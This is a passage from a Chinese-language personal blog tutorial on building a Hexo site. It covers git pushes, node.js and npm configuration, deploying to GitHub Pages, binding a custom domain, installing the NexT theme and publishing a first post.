<li>最后利用命令git push origin master将本地仓库提交到远程仓库，其中origin是远程主机的名字，这里我在提交时遇到一个问题”failed to push some  refs to git”</li>
</ul>
<p><img src="https://cdn.jsdelivr.net/gh/hskull00/Images/Linux%E4%BA%8C%E8%BF%9B%E5%88%B6%E5%88%86%E6%9E%90/image-20201128232757143.png" alt="image-20201128232757143"></p>
<p>该报错主要问题是在这期间对github上的远程仓库进行了修改，所以要用命令git pull –rebase origin master进行更新，然后再次提交即可成功：</p>
<p><img src="https://cdn.jsdelivr.net/gh/hskull00/Images/Linux%E4%BA%8C%E8%BF%9B%E5%88%B6%E5%88%86%E6%9E%90/image-20201128233248440.png" alt="image-20201128233248440"></p>
<p>打开github进行查看，确实是提交成功：</p>
<p><img src="https://cdn.jsdelivr.net/gh/hskull00/Images/Linux%E4%BA%8C%E8%BF%9B%E5%88%B6%E5%88%86%E6%9E%90/image-20201128233347882.png" alt="image-20201128233347882"></p>
<ul>
<li>另外要想删除一个文件利用git rm命令，具体操作可以参考下图：</li>
</ul>
<p><img src="https://cdn.jsdelivr.net/gh/hskull00/Images/Linux%E4%BA%8C%E8%BF%9B%E5%88%B6%E5%88%86%E6%9E%90/image-20201129111140260.png" alt="image-20201129111140260"></p>
<p>其余还有很多操作命令，留待大家自己琢磨。</p>
<h1 id="安装node-js和Hexo"><a href="#安装node-js和Hexo" class="headerlink" title="安装node.js和Hexo"></a>安装node.js和Hexo</h1><p>在<a href="https://nodejs.org/en/">Node.js官网</a>下载最新的node.js，然后进行安装，傻瓜式Next安装操作，这里注意最好还是安装在C盘之外的盘符中，完成后cmd命令行验证是否有环境变量，验证是否安装成功：</p>
<p><img src="https://cdn.jsdelivr.net/gh/hskull00/Images/Linux%E4%BA%8C%E8%BF%9B%E5%88%B6%E5%88%86%E6%9E%90/image-20201129181551763.png" alt="image-20201129181551763"></p>
<p>然后我们需要配置一下npm在安装全局模块时的路径和缓存cache的路径。默认情况下，在进行模块安装时，路径为C盘，所以需要手动修改到其它盘。具体操作是：</p>
<ul>
<li>在node.js的安装目录下，新建两个文件夹node_global、node_cache：</li>
</ul>
<p><img src="https://cdn.jsdelivr.net/gh/hskull00/Images/Linux%E4%BA%8C%E8%BF%9B%E5%88%B6%E5%88%86%E6%9E%90/image-20201129185223857.png" alt="image-20201129185223857"></p>
<ul>
<li>cmd中键入命令</li>
</ul>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">npm config set prefix node_global_path</span><br><span class="line">npm config set cache node_cache_path</span><br></pre></td></tr></table></figure>

<p><img src="https://cdn.jsdelivr.net/gh/hskull00/Images/Linux%E4%BA%8C%E8%BF%9B%E5%88%B6%E5%88%86%E6%9E%90/image-20201129185538116.png" alt="image-20201129185538116"></p>
<ul>
<li><p>在系统变量下新建一个变量，变量名为”NODE_PATH”，变量值为”D:\Program Files\nodejs\node_modules”。并将nmp对应的路径修改为”D:\Program Files\nodejs\node_global”</p>
</li>
<li><p>验证测试，利用命令npm install -g webpack-cli 安装webpack模块进行测试，成功安装后该模块被放在了我们新建的node_global中：</p>
</li>
</ul>
<p><img src="https://cdn.jsdelivr.net/gh/hskull00/Images/Linux%E4%BA%8C%E8%BF%9B%E5%88%B6%E5%88%86%E6%9E%90/image-20201129191523497.png" alt="image-20201129191523497"></p>
<p>这里要注意，为什么我要安装webpack的CLI，因为在webpack3中，webpack本身和他的CLI都是在一个包中的，但是在最新的webpack4中，这两者被分开了，如果用webpack单独安装，查看版本时会显示如下错误，提示CLI不存在。这种情况下若想使用webpack命令，需要进入“node_modules/.bin/webpack”才能执行命令：</p>
<p><img src="https://cdn.jsdelivr.net/gh/hskull00/Images/Linux%E4%BA%8C%E8%BF%9B%E5%88%B6%E5%88%86%E6%9E%90/image-20201129201800613.png" alt="image-20201129201800613"></p>
<p>所以需要全局安装webpack-cli，这样就不需要进入bin目录，和之前版本操作就一样了，这里如果已经单独安装webpack了，可以使用如下命令重新安装webpack-cli：</p>
<p><img src="https://cdn.jsdelivr.net/gh/hskull00/Images/Linux%E4%BA%8C%E8%BF%9B%E5%88%B6%E5%88%86%E6%9E%90/image-20201129202140842.png" alt="image-20201129202140842"></p>
<h1 id="Hexo的安装"><a href="#Hexo的安装" class="headerlink" title="Hexo的安装"></a>Hexo的安装</h1><ul>
<li>Hexo是搭建个人博客最常用到的框架，通过npm install -g hexo-cli进行安装。新建一个Blog文件夹，然后Git Bash终端进入Blog目录，键入npm命令安装Hexo，因为有墙的关系，所以经常会安装错误，可以手动修改一下源地址为淘宝的NPM镜像源：</li>
</ul>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">npm config set registry http://registry.npm.taobao.org/</span><br></pre></td></tr></table></figure>

<ul>
<li>安装完成后输入hexo init命令进行初始化，如果卡在下述提示不动，说明因为墙导致从github下载hexo库出问题，可以选择切换一下手机热点(简单，亲测有效)，或者设置一个github代理：</li>
</ul>
<p><img src="https://cdn.jsdelivr.net/gh/hskull00/Images/Linux%E4%BA%8C%E8%BF%9B%E5%88%B6%E5%88%86%E6%9E%90/image-20201129204626379.png" alt="image-20201129204626379"></p>
<p><img src="https://cdn.jsdelivr.net/gh/hskull00/Images/Linux%E4%BA%8C%E8%BF%9B%E5%88%B6%E5%88%86%E6%9E%90/image-20201129204725555.png" alt="image-20201129204725555"></p>
<ul>
<li>之后用hexo g进行静态部署：</li>
</ul>
<p><img src="https://cdn.jsdelivr.net/gh/hskull00/Images/Linux%E4%BA%8C%E8%BF%9B%E5%88%B6%E5%88%86%E6%9E%90/image-20201129204851432.png" alt="image-20201129204851432"></p>
<ul>
<li>网页部署完成后，用hexo s命令运行server，然后查看localhost:4000即为博客网页：</li>
</ul>
<p><img src="https://cdn.jsdelivr.net/gh/hskull00/Images/Linux%E4%BA%8C%E8%BF%9B%E5%88%B6%E5%88%86%E6%9E%90/image-20201129210202166.png" alt="image-20201129210202166"></p>
<p><img src="https://cdn.jsdelivr.net/gh/hskull00/Images/Linux%E4%BA%8C%E8%BF%9B%E5%88%B6%E5%88%86%E6%9E%90/image-20201129210058129.png" alt="image-20201129210058129"></p>
<h1 id="将Hexo部署到GitHub"><a href="#将Hexo部署到GitHub" class="headerlink" title="将Hexo部署到GitHub"></a>将Hexo部署到GitHub</h1><ul>
<li>首先我们得去GitHub上创建一个对应的仓库，要注意对于仓库的名称尽量写为<code>用户名.github.io</code>的形式(一定记住用户名命名)，不然会存在一些问题。因为这个名称会对应博客的网站，而且博客的图片显示有问题(亲测)，所以建议还是用我上面那个方式命名，除非你买个域名。创建成功后拿到仓库地址。</li>
</ul>
<p><img src="https://cdn.jsdelivr.net/gh/hskull00/Images/Linux%E4%BA%8C%E8%BF%9B%E5%88%B6%E5%88%86%E6%9E%90/image-20201129230705411.png" alt="image-20201129230705411"></p>
<p>在setting下找到GitHub Pages，将Source设置为master</p>
<p><img src="https://cdn.jsdelivr.net/gh/hskull00/Images/Linux%E4%BA%8C%E8%BF%9B%E5%88%B6%E5%88%86%E6%9E%90/image-20201129232010727.png" alt="image-20201129232010727"></p>
<ul>
<li>然后就是将hexo部署到GitHub上，首先找到我们的Blog文件夹，打开_config.yml文件进行编辑：</li>
</ul>
<p><img src="https://cdn.jsdelivr.net/gh/hskull00/Images/Linux%E4%BA%8C%E8%BF%9B%E5%88%B6%E5%88%86%E6%9E%90/image-20201129215432862.png" alt="image-20201129215432862"></p>
<p>在文件末尾处添加如下内容，主要是自己的仓库地址：</p>
<p><img src="https://cdn.jsdelivr.net/gh/hskull00/Images/Linux%E4%BA%8C%E8%BF%9B%E5%88%B6%E5%88%86%E6%9E%90/image-20201129230733432.png" alt="image-20201129230733432"></p>
<ul>
<li>接下来就是在Git Bash中安装Git部署插件，在Blog下执行npm install hexo-deployer-git –save：</li>
</ul>
<p><img src="https://cdn.jsdelivr.net/gh/hskull00/Images/Linux%E4%BA%8C%E8%BF%9B%E5%88%B6%E5%88%86%E6%9E%90/image-20201129220108991.png" alt="image-20201129220108991"></p>
<ul>
<li>完成后，使用如下三个命令进行部署三步曲：</li>
</ul>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">hexo clean    //清除缓存文件db.json和已生成的静态文件public</span><br><span class="line"> </span><br><span class="line">hexo generate  //生成网站静态文件到默认设置的public文件夹，可以用 hexo g 缩写</span><br><span class="line"> </span><br><span class="line">hexo deploy   //部署文章，可以用 hexo d 缩写</span><br></pre></td></tr></table></figure>

<p>完成后使用 https://用户名.github.io即可登陆到博客</p>
<p><img src="https://cdn.jsdelivr.net/gh/hskull00/Images/Linux%E4%BA%8C%E8%BF%9B%E5%88%B6%E5%88%86%E6%9E%90/image-20201129231810031.png" alt="image-20201129231810031"></p>
<h1 id="购买域名并绑定"><a href="#购买域名并绑定" class="headerlink" title="购买域名并绑定"></a>购买域名并绑定</h1><p>现在的域名是带了github.io的，比较low，还是尽量花点钱买一个喜欢的域名，这样访问时也比较有逼格。</p>
<p>我这里选择<a href="https://wanwang.aliyun.com/?spm=5176.12901015.0.i12901015.7dd4525cudG4ZB">阿里云</a>进行购买，由于我想要的.com域名被注册了。。。只能选个.cn域名了。买域名步骤就不记录了，有钱就行，记得实名认证。</p>
<p><strong>解析域名</strong>：</p>
<ul>
<li>实名认证后，接着就是去解析一下域名，找到应列表中已购买的域名，解析进入：</li>
</ul>
<p><img src="https://cdn.jsdelivr.net/gh/hskull00/Images/Linux%E4%BA%8C%E8%BF%9B%E5%88%B6%E5%88%86%E6%9E%90/image-20201130221219736.png" alt="image-20201130221219736"></p>
<p>添加两个记录(主机记录分别为@和www)，其中ip地址为之前的 用户名.github.io的地址，可以去ping一下获取，示例如下：</p>
<p><img src="https://cdn.jsdelivr.net/gh/hskull00/Images/Linux%E4%BA%8C%E8%BF%9B%E5%88%B6%E5%88%86%E6%9E%90/image-20201130225922939.png" alt="image-20201130225922939"></p>
<ul>
<li>接着去Blog/source下添加一个CHAME文件，写入域名，这里不加www就可以做到访问不带www也可以访问到：</li>
</ul>
<p><img src="https://cdn.jsdelivr.net/gh/hskull00/Images/Linux%E4%BA%8C%E8%BF%9B%E5%88%B6%E5%88%86%E6%9E%90/image-20201130230403385.png" alt="image-20201130230403385"></p>
<ul>
<li>然后部署三步曲，这是后去GitHub上看，CHAME被添加到了项目中，打开setting，下拉就可以看到域名已被添加了：</li>
</ul>
<p><img src="https://cdn.jsdelivr.net/gh/hskull00/Images/Linux%E4%BA%8C%E8%BF%9B%E5%88%B6%E5%88%86%E6%9E%90/image-20201130230901317.png" alt="image-20201130230901317"></p>
<p>如果在项目中没有CHAME文件可以自己手动添加一个，只要保证上述domain中有自己的domain就行。</p>
<ul>
<li>就这样，输入hskull.cn即可到达我的博客：</li>
</ul>
<p><img src="https://cdn.jsdelivr.net/gh/hskull00/Images/Linux%E4%BA%8C%E8%BF%9B%E5%88%B6%E5%88%86%E6%9E%90/image-20201130231735139.png" alt="image-20201130231735139"></p>
<h1 id="更换主题"><a href="#更换主题" class="headerlink" title="更换主题"></a>更换主题</h1><p>默认的主题肯定是要换的，这毋庸置疑。hexo有很多开源的主题可以使用，可以自己去进行挑选喜欢的，作为一个技术分享为主的博客，那主题简洁明了就好，所以还是选择了最经典的NexT。(换主题了，推荐Butterfy，就是我现在用的主题，非常好看，真香。)</p>
<ul>
<li><p>下载NexT主题,下载最新版本的主题，我下载时为NexT v7.8.0，GitHub地址：<a href="https://github.com/theme-next/hexo-theme-next">/theme-next/hexo-theme-next</a>。</p>
<p>注：一些教程依旧是NexT V5的版本，其仓库为<a href="https://github.com/iissnan/hexo-theme-next">lissnan</a>，依据官方说法，我们还是使用新版的为好，之前我下的旧版本就有很多错误。</p>
</li>
<li><p>主题的配置都似乎将主题克隆到Blog下的themes目录，所以我们进入Blog目录下，执行如下命令进行克隆：</p>
</li>
</ul>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">git clone https://github.com/theme-next/hexo-theme-next themes/next</span><br></pre></td></tr></table></figure>

<p>如果出现下述错误：</p>
<p><img src="https://cdn.jsdelivr.net/gh/hskull00/Images/Linux%E4%BA%8C%E8%BF%9B%E5%88%B6%E5%88%86%E6%9E%90/image-20201201225211259.png" alt="image-20201201225211259"></p>
<p>修改为下述命令再次下载:</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">git clone git://github.com/theme-next/hexo-theme-next themes/next</span><br></pre></td></tr></table></figure>

<ul>
<li>任何教程中都会提及两份重要的配置文件，名称为<code>_config.yml</code>，分别为：<ul>
<li>位于站点根目录下的<strong>站点配置文件</strong>，用于网站的基础配置</li>
<li>位于themes目录下的<strong>主题配置文件</strong>，用于主题相关的配置</li>
</ul>
</li>
</ul>
<p>当下载好主题后，先进行一个初步配置使得主题上线，看看效果。先打开站点配置文件，修改基础信息和设置主题：</p>
<figure class="highlight txt"><table><tr><td class="code"><pre><span class="line"># Site</span><br><span class="line">title: hskull   </span><br><span class="line">subtitle: hskull</span><br><span class="line">description: 我的博客</span><br><span class="line">keywords: </span><br><span class="line">author: hskull</span><br><span class="line">language: zh-Ch       #语言依据主题内languages下存储的语言设置,旧版为zh-Hans</span><br><span class="line">timezone: Asia/BeiJing    #时区，默认依据电脑时间</span><br><span class="line">。。。</span><br><span class="line"># Extensions</span><br><span class="line">## Plugins: https://hexo.io/plugins/</span><br><span class="line">## Themes: https://hexo.io/themes/</span><br><span class="line">#theme: landscape</span><br><span class="line">theme: next</span><br></pre></td></tr></table></figure>

<p>然后打开主题的配置文件，搜索Schemes，然后选择一个风格，几个风格介绍如下：</p>
<figure class="highlight txt"><table><tr><td class="code"><pre><span class="line">Muse - 默认 Scheme，这是 NexT 最初的版本，黑白主调，大量留白</span><br><span class="line">Mist - Muse 的紧凑版本，整洁有序的单栏外观</span><br><span class="line">Pisces - 双栏 Scheme，小家碧玉似的清新</span><br><span class="line">Gemini - 新款，似乎用的最多，但看不出和Pisces的区别。。。</span><br></pre></td></tr></table></figure>

<p><img src="https://cdn.jsdelivr.net/gh/hskull00/Images/Linux%E4%BA%8C%E8%BF%9B%E5%88%B6%E5%88%86%E6%9E%90/image-20201201230559669.png" alt="image-20201201230559669"></p>
<ul>
<li>使用旧版的hexo后，完成上述配置后，进行部署三步曲，完成后去打开博客，就呈现了如下的效果：</li>
</ul>
<p><img src="https://cdn.jsdelivr.net/gh/hskull00/Images/Linux%E4%BA%8C%E8%BF%9B%E5%88%B6%E5%88%86%E6%9E%90/image-20201201232721018.png" alt="image-20201201232721018"></p>
<p>失败了，查询原因后发现时是hexo再5.0之后把swig给删除了，它是JS模板引擎，用于渲染页面，执行命令npm  install hexo-renderer-swig下载，之后继续部署，显示成功:</p>
<p><img src="https://cdn.jsdelivr.net/gh/hskull00/Images/Linux%E4%BA%8C%E8%BF%9B%E5%88%B6%E5%88%86%E6%9E%90/image-20201201233741081.png" alt="image-20201201233741081"></p>
<p> 所以建议还是下载hexo 6.x之后版本。</p>
<p>进行到这一步后，你应该已经迫不及待的想发布一篇文章看看了，如果想继续美化界面，可以去参考网上大佬们的教程，这里不再献丑。</p>
<h1 id="发布第一篇文章"><a href="#发布第一篇文章" class="headerlink" title="发布第一篇文章"></a>发布第一篇文章</h1><ul>
<li>使用命令创建文章：</li>
</ul>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> hexo new [layout] &lt;title&gt;</span>      </span><br><span class="line"><span class="meta">#</span><span class="bash">这里layout选填，默认为Post，可以通过修改 _config.yml 中的 default_layout 参数来指定默认布局</span></span><br></pre></td></tr></table></figure>

<p>该命令会在/sources/_posts下创建一个title.md的文件，然后就可以编辑md文件写自己的文章了。也可以直接将写好的md文件放入对于目录下，配置号下述属性即可。</p>
<ul>
<li>打开创建的模板md文件，开头可以看见三个模板的配置属性，进行配置：</li>
</ul>
<p><img src="https://cdn.jsdelivr.net/gh/hskull00/Images/Linux%E4%BA%8C%E8%BF%9B%E5%88%B6%E5%88%86%E6%9E%90/image-20201202000040602.png"></p>
<p>另外还有一些其它的配置(Scaffold)如下：</p>
<table>
<thead>
<tr>
<th>参数</th>
<th>描述</th>
</tr>
</thead>
<tbody><tr>
<td>layout</td>
<td>布局</td>
</tr>
<tr>
<td>updated</td>
<td>更新日期</td>
</tr>
<tr>
<td>comment</td>
<td>开启文章的评论功能</td>
</tr>
<tr>
<td>categories</td>
<td>分类</td>
</tr>
<tr>
<td>permalink</td>
<td>覆盖文章网站</td>
</tr>
<tr>
<td>keywords</td>
<td>仅用于 meta 标签和 Open Graph 的关键词（不推荐使用）</td>
</tr>
</tbody></table>
<ul>
<li> 接下来hexo s本地测试一下，成功完成文章发布：</li>
</ul>
<p><img src="https://cdn.jsdelivr.net/gh/hskull00/Images/Linux%E4%BA%8C%E8%BF%9B%E5%88%B6%E5%88%86%E6%9E%90/image-20201202005452612.png" alt="image-20201202005452612"></p>
<p>你也可以部署三步曲进行部署，然后用域名进入测试，结果一般都是ok的。</p>
]]></content>
      <categories>
        <category>教程</category>
      </categories>
      <tags>
        <tag>博客</tag>
        <tag>教程</tag>
      </tags>
  </entry>
</search>
